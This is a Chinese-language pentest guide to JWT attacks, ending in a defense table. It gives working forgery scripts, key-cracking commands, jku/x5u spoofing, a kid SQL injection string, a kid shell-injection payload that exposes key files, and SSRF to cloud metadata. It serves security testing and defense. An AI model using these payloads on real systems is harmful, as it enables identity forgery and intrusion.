---
attack_surface: [认证/授权绕过, 密码学误用, 注入类, 信息泄露]
impact: [身份伪造, 权限提升, 信息泄露]
risk_level: 高
prerequisites:
  - HTTP/1.1 协议理解
  - JWT 三部分结构 (Header/Payload/Signature)
  - Base64URL 编码
  - Burp Suite 基础操作
related_techniques:
  - oauth-to-account-takeover
  - cookie-tossing
  - sql-injection
  - ssrf
difficulty: 中级
tools:
  - jwt_tool.py
  - Burp JWT Editor
  - hashcat (-m 16500)
  - SignSaboteur (Burp Extension)
  - jwt-cracker
---

# JWT Vulnerabilities — JSON Web Token 攻击全矩阵

> 关联文档：[OAuth Account Takeover](../../../External Identity Management/OAuth/README.md) · [Cookie Hacking](../../HTTP Headers/Cookies Hacking/README.md) · [SQL Injection](../../../User input/Structured objects/SQL Injection/README.md) · [SSRF](../../Reflected Values/SSRF/README.md) · [Brute Force](../../../../../) — 待创建

---

# 0x01 原理与分类

## 1.0 TL;DR

JWT (JSON Web Token) 由 Header、Payload、Signature 三部分组成，使用 Base64URL 编码。安全性完全依赖于签名验证的**正确实现**。攻击面集中在六个维度：算法选择逻辑、密钥来源信任、签名验证完整性、Kid/JKU 等元数据滥用、密钥泄露、以及令牌生命周期管理。一旦签名验证链条出现信任缺口，攻击者即可伪造任意用户身份的令牌。

## 1.1 JWT 结构基础

一个完整的 JWT 由三部分以 `.` 分隔组成：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
|_______________________Header________________________|__________________________Payload___________________________|____________________Signature____________________|
```

- **Header**：声明算法 (`alg`) 和令牌类型 (`typ`)，如 `{"alg": "HS256", "typ": "JWT"}`
- **Payload**：携带声明 (Claims)，包括标准声明 (`sub`, `iat`, `exp`, `iss` 等) 和自定义声明 (`role`, `userId`, `admin` 等)
- **Signature**：根据 Header 指定的算法对 `<Header>.<Payload>` 进行签名或 HMAC 计算

## 1.2 根本安全模型

JWT 安全模型的核心是：

> **客户端可以看到并修改 Header/Payload，但无法伪造签名（在没有密钥的情况下）。服务端通过重新计算签名并比对来验证令牌完整性。**

这个模型在以下任一条件下崩溃：

1. **签名未验证** — 服务端直接信任 Payload 而不检查签名
2. **算法可被篡改为 None** — 签名部分被忽略
3. **密钥已知或可爆破** — HMAC 密钥弱或泄露
4. **算法混淆** — 非对称密钥被当作对称密钥使用
5. **密钥来源可控** — Kid/JKU/x5u 等元数据指攻击者控制的密钥
6. **密钥注入** — 攻击者在 Header 中嵌入自选公钥

## 1.3 攻击面分类

| 攻击向量 | 攻击面归属 | 利用条件 | 影响 |
|----------|-----------|----------|------|
| 签名未验证 | 认证绕过 | 服务端逻辑缺陷 | 身份伪造、权限提升 |
| None Algorithm | 认证绕过 | 库接受 `alg: none` | 身份伪造、权限提升 |
| HMAC 密钥爆破 | 密码学误用 | 弱密钥 + HS256/HS384/HS512 | 身份伪造 |
| RS256→HS256 混淆 | 密码学误用 | 公钥可获取 | 身份伪造 |
| 嵌入式 JWK | 认证绕过 | 库接受 Header 中的 `jwk` | 身份伪造 |
| Kid 滥用 | 注入类 / 路径遍历 | Kid 被直接用于文件路径或 SQL | RCE / 身份伪造 |
| jku/x5u 欺骗 | 认证绕过 + SSRF | 服务端从 URL 获取密钥 | 身份伪造 |
| 配置泄露派生密钥 | 信息泄露 | 配置文件 + 数据库泄露 | 身份伪造 |

# 0x02 评估流程与检测方法

## 2.1 实用评估工作流

### 2.1.1 隔离会话控制

选择一个用户相关的请求（如个人信息、账单页面），逐个移除 Cookie 和 Header，直到请求被拒绝。这样确定哪些令牌实际控制授权。

### 2.1.2 在流量中定位 JWT

JWT 最常见于 `Authorization: Bearer <JWT>` 头部，也可能出现在自定义 Header 或 Cookie 中。如 Burp Suite 未自动高亮，可使用以下正则搜索：

- `[= ]eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*`
- `eyJ[a-zA-Z0-9_-]+?\.[a-zA-Z0-9_-]+?\.[a-zA-Z0-9_-]+`
- `[= ]eyJ[A-Za-z0-9_\\/+-]*\.[A-Za-z0-9._\\/+-]*`

搜索方法：Target → Site map → Engagement tools → Search

### 2.1.3 解码与枚举

使用 Burp **JWT Editor** 或 `python3 jwt_tool.py <JWT>` 解码并查看 Header 和 Payload。重点关注：

- `alg` 算法类型
- `exp` 过期时间与令牌生命周期
- 权限相关声明：`role`, `id`, `username`, `email`, `sub`, `admin`, `scope`, `groups`
- 颁发者 `iss` 与受众 `aud`

### 2.1.4 签名验证健全性检查

翻转或删除签名部分的若干字节后重放请求。如果服务端依然接受，说明签名验证缺失，可直接篡改 Payload 声明。

### 2.1.5 快速自动测试

使用 jwt_tool 的 `All Tests!` 模式进行批量自动测试：

```bash
python3 jwt_tool.py -M at \
    -t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
    -rh "Authorization: Bearer eyJhbG...<JWT Token>"
```

如果工具发现了可利用点会以绿色标记。也可使用 Burp 插件 [SignSaboteur](https://github.com/d0ge/sign-saboteur) 从 Burp 界面发起 JWT 攻击。

工具成功注入的示例输出（来自 `jwt_tool` 的 `acr` claim 注入测试）：

```
jwttool_706649b802c9f5e41052062a3787b291 Injected /inject_common_acr into Payload Claim: acr Response Code: 200, 1379 bytes
```

此输出表明工具成功将 `acr`（Authentication Context Class Reference）声明修改为高权限值，服务端返回 200 OK，即接受了修改后的令牌——说明存在权限提升可能。

使用 `-Q` 标志可从代理日志中转储对应的 JWT：

```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```

## 2.2 令牌来源判断

通过检查代理的请求历史，区分令牌是服务端生成还是客户端生成：

- **客户端首次出现令牌** — 密钥可能暴露在客户端代码中（JS/移动端），需进一步调查
- **服务端首次出现令牌** — 生成过程相对安全，但验证过程可能仍有漏洞

## 2.3 令牌有效期检查

检查 JWT 是否设置了 `exp` 声明、服务端是否正确处理过期。如果令牌无 `exp` 或永不过期，重放窗口无限大。

# 0x03 签名缺失与算法空值

## 3.1 签名验证缺失

最基础的漏洞：服务端完全不验证签名。

### 3.1.1 检测方法

1. 直接修改 Payload（如将 `username` 改为 `admin`），保留原签名重放
2. 翻转签名部分的几个字节看是否被拒绝
3. 如果服务端响应正常（无报错、页面内容变化），说明签名未验证

### 3.1.2 判断签名是否被验证

- **出现报错** → 签名验证存在，检查报错中是否含敏感信息
- **页面内容变化** → 签名验证存在
- **无变化** → 签名验证可能缺失，可深入篡改 Payload

## 3.2 None Algorithm 攻击

将 JWT Header 中的 `alg` 设置为 `none`，并移除签名部分。

### 3.2.1 原理

某些 JWT 库支持 `alg: "none"` 用于调试或内部通信场景。规范允许 `none` 算法用于已通过其他方式保护完整性的令牌。如果库未在生产中禁用此算法，服务端会跳过签名验证。

### 3.2.2 Payload — 基础 None 攻击

构造一个不含签名的 JWT：

```
Header:   {"alg": "none", "typ": "JWT"}
Payload:  {"sub": "admin", "role": "ROLE_ADMIN"}
```

编码为 `base64url(Header).base64url(Payload).`（注意末尾的点号保留）

```python
import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "ROLE_ADMIN"}

b64 = lambda d: base64.urlsafe_b64encode(json.dumps(d, separators=(',', ':')).encode()).decode().rstrip("=")
token = f"{b64(header)}.{b64(payload)}."
```

### 3.2.3 利用工具

- **Burp JWT Editor**：在 Repeater 的 "JSON Web Token" 标签中将 "Alg" 改为 "None"
- **jwt_tool**：`-X n` 模式自动测试 None 攻击
- **SignSaboteur** Burp 插件

### 3.2.4 变体与边界情况

- **空签名 **(CVE-2020-28042)：某些库在签名验证前检查签名是否为空字符串，但在 Base64 解码后检查，可以传 `..` 或空格绕过
- **Null 签名**：某些库接受 `null` 作为有效签名值
- **空白密码 **(CVE-2019-20933/CVE-2020-28637)：HS256 模式下使用空字符串 `""` 作为密钥

# 0x04 HMAC 密钥爆破

## 4.1 原理

HS256 (HMAC-SHA256) 使用对称密钥。如果 Header 声明 `"alg": "HS256"`，攻击者获取 JWT 后可离线尝试字典爆破密钥。爆破成功后可以伪造任意用户的令牌。

## 4.2 前提条件

- 算法为 HS256 / HS384 / HS512
- 密钥强度弱（出现在字典中或过短）
- 拥有至少一个有效的 JWT 样本

## 4.3 工具与 Payload

### 4.3.1 jwt_tool 字典模式

```bash
# 字典攻击
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# 直接指定字典（旧版语法）
python3 jwt_tool.py -d wordlists.txt <JWT token>
```

### 4.3.2 hashcat GPU 加速爆破

```bash
# JWT 存入文件（每行一个完整 JWT）
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U" > jwt.txt

# hashcat mode 16500 = JWT HS256
hashcat -m 16500 -a 0 jwt.txt /path/to/wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

### 4.3.3 John the Ripper

```bash
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256
```

### 4.3.4 专用 JWT 爆破工具

```bash
# jwtcrack (C 语言实现，速度快)
./jwtcrack <JWT> <charset> <max_length>

# jwt-cracker (Node.js)
jwt-cracker "<JWT>" "<alphabet>" <max_length>

# crackjwt.py
python crackjwt.py <JWT> /usr/share/wordlists/rockyou.txt
```

### 4.3.5 恢复密钥后的利用

在 Burp JWT Editor 中将恢复的密钥加载为对称密钥 (symmetric key)，即可对任意修改后的 Payload 重新签名。

# 0x05 算法混淆攻击 (RS256 → HS256)

## 5.1 原理 (CVE-2016-5431 / CVE-2016-10555)

这是 JWT 最经典的攻击模式之一：

1. **RS256** (非对称)：服务端拥有私钥用于签名，公钥用于验证（通常可从 `/.well-known/jwks.json`、TLS 证书或客户端代码获取）
2. **HS256** (对称)：使用同一个密钥进行签名和验证

如果服务端的 JWT 验证逻辑不强制算法白名单，攻击者可以：

1. 将 Header 中的 `alg` 从 `RS256` 改为 `HS256`
2. 将**服务端公钥**作为 HS256 的对称密钥
3. 用该公钥重新签名修改后的 Payload

服务端验证时：按 HS256 逻辑使用公钥作为密钥计算 HMAC，结果与攻击者用相同公钥计算的 HMAC 一致 → 验证通过。

## 5.2 前提条件

- 服务端接受 `alg` 为 HS256（无算法白名单）
- 公钥可获取（JWKS 端点、TLS 证书、客户端 JS 代码）

## 5.3 获取公钥

### 从 TLS 证书提取

```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```

### 从 JWKS 端点获取

```
GET /.well-known/jwks.json
GET /api/auth/jwks
```

## 5.4 Payload — 手动构造

```python
import jwt
import json

# 读取公钥 PEM
with open('pubkey.pem', 'r') as f:
    public_key = f.read()

# 修改后的 Payload
payload = {
    "sub": "admin",
    "role": "ROLE_ADMIN",
    "iat": 1516239022
}

# 使用公钥作为 HS256 密钥重新签名
token = jwt.encode(payload, public_key, algorithm="HS256")
print(token)
```

## 5.5 自动化工具

- **Burp JWT Editor**：Repeater → JWT Editor tab → Attack → **HMAC Key Confusion Attack**，可从 JWKS 或 PEM 导入 RSA 公钥，自动尝试 HS256 重签名
- **jwt_tool**：`python3 jwt_tool.py <JWT> -X k` — 自动密钥混淆攻击
- **JOSEPH Burp Extension**：在 Repeater 中选择 JWS tab → Key confusion attack → 加载 PEM → Update

## 5.6 注意事项

- HS256 密钥长度必须足够，公钥通常为 2048+ 位 RSA 密钥，足够满足要求
- 某些库在多密钥环境中按 `kid` 选择密钥，此时需配合 Kid 操作

# 0x06 密钥注入攻击

## 6.1 嵌入式 JWK 攻击 (CVE-2018-0114)

### 6.1.1 原理

某些 JWT 库支持在 Header 中直接嵌入 `jwk` (JSON Web Key) 参数。该参数包含用于验证签名的公钥。如果服务端信任 Header 中嵌入的 `jwk` 而不进行额外的来源验证，攻击者可以：

1. 生成自己的 RSA 密钥对
2. 将公钥嵌入 JWT Header 的 `jwk` 字段
3. 用自己的私钥签名修改后的 Payload
4. 服务端从 Header 提取公钥验证 → 验证通过

典型的嵌入式 JWK Header 结构（来自真实案例）：

```json
{
    "alg": "RS256",
    "typ": "JWT",
    "jwk": {
        "kty": "RSA",
        "kid": "324-23234324-544535-1320214",
        "use": "sig",
        "n": "08d43786b1008f1119032168e01ce821e6cf3ebf67fd2188fd4dbe5d4837aa612f...",
        "e": "10001"
    }
}
```

### 6.1.2 Payload — 生成攻击令牌

```bash
# 1. 生成攻击者密钥对
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key

# 2. 从公钥提取 n 和 e（Node.js 方法）
```

```javascript
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```

```python
# 3. Python 方法提取 n, e
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```

最后使用 [jwt.io](https://jwt.io) 调试器或 Python 脚本，将新的 `n` 和 `e` 值填入 Header 的 `jwk` 字段，用对应私钥签名，生成最终攻击令牌。

### 6.1.3 自动化工具

- **Burp JWT Editor**：Repeater → JWT Editor → Attack → **Embedded JWK Attack**
- **Burp "JSON Web Tokens" Extension**：选择 "CVE-2018-0114" 并发送

### 6.1.4 从已有嵌入式 JWK 重建公钥

如果原始 JWT 已包含嵌入式公钥，可用以下 Node.js 脚本导出 PEM 格式：

```javascript
const NodeRSA = require('node-rsa');
const fs = require('fs');
n = "<extracted_base64_n_value>";
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({
    n: Buffer.from(n, 'base64'),
    e: Buffer.from(e, 'base64'),
}, 'components-public');
console.log(importedKey.exportKey("public"));
```

## 6.2 JWKS 欺骗 (jku)

### 6.2.1 原理

`jku` (JWK Set URL) 是 JWT Header 中的一个可选声明，指向包含公钥的 JWKS 文件 URL。服务端验证时会从此 URL 下载公钥。

如果服务端不验证 `jku` URL 的来源（白名单），攻击者可以：

1. 将 `jku` 指向自己控制的服务器上的 JWKS 文件
2. 用自己的私钥签名修改后的 Payload
3. 服务端从攻击者的 URL 下载公钥 → 验证通过

### 6.2.2 检测方法

1. 修改令牌的 `jku` 值为控制的 Web 服务 URL
2. 观察是否收到 HTTP 请求（DNS/HTTP 回调）
3. 收到请求即表示服务端会从外部 URL 获取密钥

**Collaborator 方式**：在 Burp JWT Editor 中使用 Attack → **Embed Collaborator payload** 将 `jku`/`x5u` 设为 Burp Collaborator URL。任何回调确认 SSRF 式密钥获取行为。

### 6.2.3 Payload — 构造恶意 JWKS

```bash
# 1. 生成攻击者证书
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```

```python
# 2. 从公钥提取 n 和 e 参数
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```

3. 将 JWKS 文件托管在攻击者服务器（需 HTTPS 或内网可达）
4. 使用 [jwt.io](https://jwt.io) 创建新 JWT，将 `jku` 指向攻击者 JWKS 文件，用攻击者私钥签名

### 6.2.4 jwt_tool 自动化

首先更新 `jwtconf.ini` 中的 JWKS 位置为个人服务器地址，然后：

```bash
python3 jwt_tool.py <JWT> -X s
```

`jwtconf.ini` 中还需配置 `httplistener`（如 Burp Collaborator 地址或 RequestBin URL）以捕获外部交互。

# 0x07 Kid 参数滥用

## 7.1 原理

`kid` (Key ID) 是 JWT Header 中的一个可选声明，用于在多密钥环境中标识应使用哪个密钥进行验证。漏洞出现在服务端以不安全的方式使用 `kid` 值时：

- 直接将 `kid` 拼接到文件系统路径中获取密钥文件
- 将 `kid` 嵌入 SQL 查询中以查找密钥
- 将 `kid` 传递给系统命令

## 7.2 Kid 路径遍历

### 7.2.1 原理

当 `kid` 值被直接拼接到文件路径（如 `/keys/{kid}.pem`）时，攻击者可通过路径遍历指向已知内容的文件（如 `/dev/null`），然后使用空内容或文件内容作为密钥。

### 7.2.2 Payload

```bash
# 使用 jwt_tool 修改 kid 值
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

此命令将 `kid` 改为 `../../dev/null`，用空字符串作为 HS256 密钥重新签名。`/dev/null` 为空，因此使用 `p ""`（空密码）。

### 7.2.3 已知内容的文件

`/proc/sys/kernel/randomize_va_space` 在 Linux 系统中已知包含值 `2`。可以：
- 设置 `kid` 为 `../../proc/sys/kernel/randomize_va_space`
- 使用 `2` 作为 HS256 密钥重新签名 JWT

### 7.2.4 通用空文件攻击模式

当密钥加载路径使用路径遍历指向 `/dev/null` 时，某些实现将空文件视为有效 HMAC 密钥：

1. 生成 HS256 密钥，JWK 的 `k` 设为 `AA==`（空内容的 Base64 URL-safe 编码）
2. 设置 `kid` 为 `../../../../../../../dev/null`
3. 用空密钥重新签名
4. 某些实现将空文件读取为有效密钥 → 接受伪造令牌

## 7.3 Kid SQL 注入

### 7.3.1 原理

当 `kid` 值被用于数据库查询（如 `SELECT key FROM jwks WHERE kid='{kid}'`）时，注入攻击可以控制返回的密钥值。

### 7.3.2 Payload

```
non-existent-index' UNION SELECT 'ATTACKER';-- -
```

如果此注入成功，数据库查询将返回 `ATTACKER` 作为密钥，攻击者可用 `ATTACKER` 作为 HS256 密钥重新签名任意 JWT。

## 7.4 Kid OS 命令注入

### 7.4.1 原理

当 `kid` 值被传递给系统命令（如通过 `openssl` 或文件加载脚本）时，可注入命令实现 RCE。

### 7.4.2 Payload

```
/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&
```

如果此注入成功，攻击者不仅可获取 JWT 密钥文件，还可在目标服务器上启动 HTTP 服务器暴露私钥目录。

# 0x08 x5u / x5c 证书注入

## 8.1 x5u — X.509 URL

### 8.1.1 原理

`x5u` 指向一个 X.509 证书链（PEM 格式）的 URL。服务端从此 URL 下载证书，提取第一个证书中的公钥用于验证。攻击者将 `x5u` 指向自己控制的证书 URL。

### 8.1.2 检测与利用

Header 示例（来自 jwt.io 调试器界面）：

```json
{
    "alg": "RS256",
    "typ": "JWT",
    "x5u": "http://192.87.15.2:8080/attacker.crt"
}
```

```bash
# 1. 生成攻击者证书
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem

# 2. 托管 attacker.crt 在可控 HTTP 服务器
# 3. 使用 jwt.io 创建新 JWT，x5u 指向攻击者证书 URL
# 4. 用攻击者私钥签名
```

### 8.1.3 自动化

Burp JWT Editor → Attack → **Embed Collaborator payload** — 将 `x5u` 设置为 Collaborator URL。收到回调后，在该 URL 托管自己的 PEM 并用私钥重签名。

## 8.2 x5c — X.509 Certificate Chain (内联)

### 8.2.1 原理

`x5c` 包含嵌入在 JWT Header 中的 Base64 编码 X.509 证书链。如果服务端信任 Header 中的 `x5c` 而不查询可信 CA，攻击者可以嵌入自签名证书。

典型 `x5c` Header 结构（来自真实 JWK 示例）：

```json
{
    "use": "sig",
    "e": "MTAwMDE",
    "kty": "RSA",
    "alg": "RS256",
    "n": "MDBkNGMxZDk4Nzd1NmZiMTc1NjU4NzdkMmExNjU5YWI4MzBkNzY1MGVjZjg3...",
    "x5c": "MIIGCTCCA/GgAwIBAgIUR/jZCE3YIu6LM60QGuFtrb//F4wD0yJKoZIhvc..."
}
```

### 8.2.2 Payload

```bash
# 生成攻击者证书
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -in attacker.crt -text
```

将生成的证书 Base64 编码后替换 `x5c` 值，同时更新 `n`、`e` 和 `x5t` 参数以匹配自签名证书。

## 8.3 SSRF 联动

`jku` 和 `x5u` 都可用于触发 SSRF：

- 将 `jku`/`x5u` 指向内网地址探测存活
- 指向云元数据端点 (`http://169.254.169.254/latest/meta-data/`)
- 指向内部服务 API

# 0x09 JWE 封装攻击

## 9.1 PlainJWT 认证绕过 (pac4j-jwt CVE-2026-29000)

### 9.1.1 原理

某些技术栈期望 JWT 被封装在 JWE (JSON Web Encryption) 加密层内，其结构为：

```
JWE(Encrypted) { JWT(Signed) }
```

在存在漏洞的 `pac4j-jwt` 版本（< 4.5.9, < 5.7.9, < 6.3.3）中，认证流程为：

1. 解密 JWE 获取内部明文内容
2. 调用 Nimbus JOSE+JWT 库的 `toSignedJWT()` 尝试将明文解析为签名 JWT (JWS)
3. 如果明文是带签名的 JWS → `toSignedJWT()` 返回解析对象 → 进入签名验证路径
4. 如果明文是 **PlainJWT**（无签名的纯声明令牌，JWT 规范定义的合法格式）→ `toSignedJWT()` **返回 `null`**
5. pac4j 代码中的条件判断 `if (signedJWT != null)` — 当 `signedJWT` 为 `null` 时，**整个签名验证块被跳过**
6. 认证流程继续使用令牌中的声明创建用户主体 → **认证成功，无需任何密钥**

**关键根因**：`toSignedJWT()` 返回 `null` 的行为是合法且符合 JWT 规范的（PlainJWT 确实不是 SignedJWT）。问题出在 pac4j 将该方法返回值直接作为认证门控，未处理 PlainJWT 场景——原本设计为"加密+签名"的双层保护，PlainJWT 路径使其退化为"仅加密=认证"。

CVSS: **10.0 (Critical)**

### 9.1.2 前提条件

- 应用接受 JWE Bearer Token
- 服务端公钥暴露（通常通过 `/.well-known/jwks.json` 或 `/api/auth/jwks`）
- 授权依赖攻击者可控制的声明（如 `sub`, `role`, `groups`, `scope`）

### 9.1.3 检测方法

- 在前端代码 / API 文档中搜索：`RSA-OAEP-256`, `A128GCM`/`A256GCM`, `jwks`, 或 "inner JWT is signed" 等关键字符串
- 尝试分析合法 JWT 是否为 JWE 格式（JWE 以 5 个 Base64URL 段组成，而非 JWT 的 3 段）

### 9.1.4 Payload — PlainJWT 构造

```python
import json, base64

header = {"alg": "none"}
claims = {"sub": "admin", "role": "ROLE_ADMIN", "iss": "target"}

b64 = lambda b: base64.urlsafe_b64encode(b).decode().rstrip("=")
plain = (
    f"{b64(json.dumps(header, separators=(',', ':')).encode())}."
    f"{b64(json.dumps(claims, separators=(',', ':')).encode())}."
)
```

### 9.1.5 Payload — JWE 加密封装

```python
from jwcrypto import jwk, jwe

# 从 JWKS 获取 RSA 公钥
rsa_key = jwk.JWK(**jwks["keys"][0])

# 将 PlainJWT 加密为 JWE
token = jwe.JWE(
    plaintext=plain.encode(),
    protected=json.dumps({"alg": "RSA-OAEP-256", "enc": "A256GCM"}),
    recipient=rsa_key,
)
forged = token.serialize(compact=True)
```

### 9.1.6 注意事项

- 如果 JWT 库拒绝输出 `alg=none`，手动构造紧凑令牌（如 9.1.4 所示）
- `enc` 值必须匹配目标接受的加密算法；可从正常流量或前端注释中推断
- SPA 中检查 Bearer Token 是否存储在 `sessionStorage`, `localStorage` 或 JS 可访问的 Cookie 中；直接替换即可快速验证

# 0x0A 派生密钥与配置泄露

## 10.1 原理

如果通过任意文件读取（或备份泄露）同时暴露了**应用加密材料**和**用户记录**，有时可以直接恢复 JWT 签名密钥并伪造会话 Cookie，完全无需知道明文密码。

## 10.2 真实案例模式

此模式来自 CVE-2026-21858（n8n 工作流自动化平台，CVE-2026-21858 为独立编号，与前述 pac4j 漏洞不同，但模式有参考价值）：

1. 泄露 `encryptionKey`（来自配置文件）
2. 泄露用户表获取 `email`, `password_hash`, `user_id`
3. 从加密密钥派生 JWT 签名密钥，再派生每用户 hash：

```python
import hashlib, base64, jwt

# 从配置文件提取的加密密钥
encryption_key = "leaked_app_encryption_key"

# 派生 JWT 签名密钥
jwt_secret = hashlib.sha256(encryption_key[::2].encode()).hexdigest()

# 派生用户 JWT hash（用于 payload 验证）
email = "admin@example.com"
password_hash = "$2b$10$..."  # 来自泄露的数据库
jwt_hash = base64.b64encode(
    hashlib.sha256(f"{email}:{password_hash}".encode()).digest()
).decode()[:10]

# 伪造 JWT
token = jwt.encode(
    {"id": user_id, "hash": jwt_hash},
    jwt_secret,
    algorithm="HS256"
)
```

4. 将签名后的 Token 放入会话 Cookie（如 `n8n-auth`）即可冒充任意用户/管理员，即使密码 Hash 已加盐。

# 0x0B 其他攻击向量

## 11.1 ES256 相同 Nonce 私钥恢复

### 11.1.1 原理

ECDSA 签名算法在生成签名时需要一个随机 nonce (k)。如果使用相同的 nonce 签署两个不同的 JWT，攻击者可以通过密码学分析恢复私钥。

### 11.1.2 利用参考

参考 [ECDSA: Revealing the private key, if same nonce used](https://asecuritysite.com/encryption/ecd5)，通过两个共享相同 `r` 值的签名可以代数推导出私钥。

## 11.2 JTI 重放攻击

### 11.2.1 原理

JTI (JWT ID) 提供令牌的唯一标识符，用于防重放。但如果 JTI 长度受限（如仅 4 位 0001-9999），ID 会循环使用。例如请求 `0001` 和 `10001` 会使用相同的 `0001` ID。

### 11.2.2 利用场景

如果后端在每次验证时递增 JTI，攻击者可以在 10000 次请求的间隔后重放旧请求（每次成功重放之间需要发送约 10000 个请求）。

## 11.3 跨服务中继攻击

当多个应用共享同一个 JWT 服务生成令牌时，为某应用 A 生成的令牌可能被应用 B 接受。

### 检测方法

1. 观察 JWT 的签发/续期是否通过第三方 JWT 服务
2. 在 JWT 服务的另一个客户应用中以相同用户名/邮箱注册
3. 将获取的令牌重放到目标应用

如果目标接受令牌，则存在严重身份伪造漏洞（理论上可冒充任何用户）。

## 11.4 令牌过期验证缺陷

- 检查 `exp` 是否被服务端正确验证
- 存储令牌并在过期后重放，检查是否仍被接受
- 如果过期令牌仍被接受，说明令牌永不过期，安全风险严重
- 使用 jwt_tool 的 `-R` 标志读取令牌内容（时间戳以 UTC 为准）

## 11.5 已注册声明参考

JWT 规范定义的标准声明（IANA JWT Claims Registry）：

| 声明 | 全称 | 用途 |
|------|------|------|
| `iss` | Issuer | 令牌颁发者 |
| `sub` | Subject | 令牌主体（通常为用户 ID） |
| `aud` | Audience | 令牌目标接收方 |
| `exp` | Expiration Time | 过期时间 (UNIX timestamp) |
| `nbf` | Not Before | 生效时间 |
| `iat` | Issued At | 签发时间 |
| `jti` | JWT ID | 唯一标识符（防重放） |

# 0x0C 工具链

## 12.1 核心工具

| 工具 | 用途 | 链接 |
|------|------|------|
| **jwt_tool** | JWT 渗透测试瑞士军刀：解码、篡改、密钥爆破 (`-C`)、半自动攻击 (`-M at`)、Known Exploit 测试 | [github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) |
| **Burp JWT Editor** | Burp Suite 内 JWT 解码/重签名、密钥管理、内置攻击（None / Key Confusion / Embedded JWK / Collaborator payloads） | [github.com/PortSwigger/jwt-editor](https://github.com/PortSwigger/jwt-editor) |
| **hashcat** `-m 16500` | GPU 加速 HS256 密钥爆破 | [hashcat.net](https://hashcat.net/hashcat/) |
| **SignSaboteur** | Burp Extension，直接在 Burp 代理中发起 JWT 攻击 | [github.com/d0ge/sign-saboteur](https://github.com/d0ge/sign-saboteur) |

## 12.2 专用爆破工具

| 工具 | 特点 | 链接 |
|------|------|------|
| **jwtcrack** (C) | C 语言实现，速度最快 | [github.com/Sjord/jwtcrack](https://github.com/Sjord/jwtcrack) |
| **jwt-cracker** (Node.js) | 轻量级 | [github.com/lmammino/jwt-cracker](https://github.com/lmammino/jwt-cracker) |
| **jwt-pwn** (Python) | 自动化字典攻击 | [github.com/mazen160/jwt-pwn](https://github.com/mazen160/jwt-pwn) |

## 12.3 jwt_tool 常用命令速查

```bash
# 解码 JWT
python3 jwt_tool.py <JWT>

# 自动化全部攻击测试
python3 jwt_tool.py -M at -t "<URL>" -rh "Authorization: Bearer <JWT>"

# HMAC 密钥字典爆破
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# None 算法攻击测试
python3 jwt_tool.py <JWT> -X n

# 密钥混淆攻击
python3 jwt_tool.py <JWT> -X k

# JWKS 欺骗
python3 jwt_tool.py <JWT> -X s

# 修改 Kid 值（路径遍历）
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# 读取令牌详情（含时间戳解析）
python3 jwt_tool.py <JWT> -R

# 从代理日志关联 JWT
python3 jwt_tool.py -Q "<jwttool_session_id>"
```

# 0x0D 检测与防御

## 13.1 开发侧防御矩阵

| 攻击类型 | 防御措施 | 优先级 |
|----------|----------|--------|
| None Algorithm | 强制算法白名单，拒绝 `alg: none` | **P0** |
| 签名未验证 | 始终调用验证函数，不信任未验证声明 | **P0** |
| RS256→HS256 | 算法绑定：RS256 的密钥必须与 HS256 的密钥不同源；强制算法白名单 | **P0** |
| 嵌入式 JWK | 不信任 Header 中的 `jwk`，只使用服务端预注册的密钥 | **P1** |
| jku/x5u | jku URL 白名单 + HTTPS 强制；或禁用外部密钥获取 | **P1** |
| Kid 注入 | 将 `kid` 值仅作为查找键（查表），不拼接路径/不嵌入 SQL/不传递给 shell | **P1** |
| HMAC 密钥爆破 | 密钥长度 ≥ 256 bits，使用随机生成的高熵密钥 | **P1** |
| 令牌永不过期 | 设置合理的 `exp`（建议 ≤ 1 小时），配合 Refresh Token 机制 | **P1** |
| JTI 重放 | 服务端维护 JTI 黑名单，使用足够长的 JTI（≥ 128 bits） | **P2** |
